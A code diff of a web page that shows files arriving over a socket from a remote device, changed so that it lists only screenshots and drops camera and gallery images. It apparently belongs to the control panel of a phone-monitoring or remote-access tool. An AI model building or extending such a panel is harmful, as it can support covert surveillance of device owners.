@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Screenshots & Gallery</title>
+    <title>Screenshots Only</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <style>
@@ -11,13 +11,13 @@
         body { background: #0f0f0f; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; min-height: 100vh; }
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
         .back-btn { background: rgba(255,255,255,0.1); padding: 10px 15px; border-radius: 12px; color: #fff; text-decoration: none; }
-        .page-title { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; color: #00f3ff; } /* Blue for Screen */
+        .page-title { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; color: #00f3ff; } 
         
         /* TABS */
         .tabs-container { display: flex; gap: 15px; margin-bottom: 25px; background: rgba(255,255,255,0.05); padding: 8px; border-radius: 15px; }
         .tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: #666; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; border-radius: 10px; transition: 0.3s; }
         
-        /* Active Tab Style (Blue for Screen) */
+        /* Active Tab Style */
         .tab-btn.active { background: rgba(0, 243, 255, 0.15); color: #00f3ff; border: 1px solid #00f3ff; }
         .tab-btn.inactive:hover { background: rgba(255,255,255,0.1); color: #fff; }
 
@@ -79,7 +79,6 @@
         let isLoading = false;
         const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
 
-        // Page Switcher
         function navigateTo(page) {
             if(DEVICE_ID) window.location.href = `${page}?id=${DEVICE_ID}`;
             else window.location.href = page;
@@ -91,11 +90,11 @@
             
             socket.on('new-file', (data) => {
                 if (data.device_id === DEVICE_ID) {
-                    // Check if it's NOT a camera file
                     let u = data.url.toLowerCase();
-                    let isCam = u.includes('front') || u.includes('back') || u.includes('cam');
+                    // 🔥 NEW LOGIC: Only allow if 'screen' or 'shot' is in name AND 'gallery' is NOT in name
+                    let isScreen = (u.includes('screen') || u.includes('shot')) && !u.includes('gallery');
                     
-                    if(!isCam) {
+                    if(isScreen) {
                         if(!allFilesData.includes(data.url)) {
                             allFilesData.unshift(data.url);
                             renderGallery();
@@ -134,25 +133,28 @@
             const grid = document.getElementById('galleryGrid');
             grid.innerHTML = '';
             
-            // 🔥 FILTER: Everything EXCEPT Camera
+            // 🔥 STRICT FILTER: Sirf Screenshot
             const filtered = allFilesData.filter(url => {
                 let u = url.toLowerCase();
-                let isCam = u.includes('front') || u.includes('back') || u.includes('cam');
-                return !isCam; 
+                
+                // 1. Agar 'gallery' likha hai, to hata do (FALSE)
+                if (u.includes('gallery')) return false;
+
+                // 2. Agar 'cam', 'front', 'back' hai, to hata do (FALSE)
+                if (u.includes('cam') || u.includes('front') || u.includes('back')) return false;
+
+                // 3. Agar 'screen' ya 'shot' hai tabhi dikhao (TRUE)
+                return u.includes('screen') || u.includes('shot');
             });
 
             if(filtered.length === 0) document.getElementById('emptyState').style.display = 'block';
             else document.getElementById('emptyState').style.display = 'none';
 
             filtered.forEach(url => {
-                let badge = "Screen/Gallery";
-                if(url.toLowerCase().includes('screen')) badge = "Screenshot";
-                else if(url.toLowerCase().includes('gallery')) badge = "Gallery File";
-
                 grid.innerHTML += `
                     <div class="img-card" onclick="openModal('${url}')">
                         <img src="${url}" loading="lazy">
-                        <div class="source-badge">${badge}</div>
+                        <div class="source-badge">Screenshot</div>
                     </div>`;
             });
         }
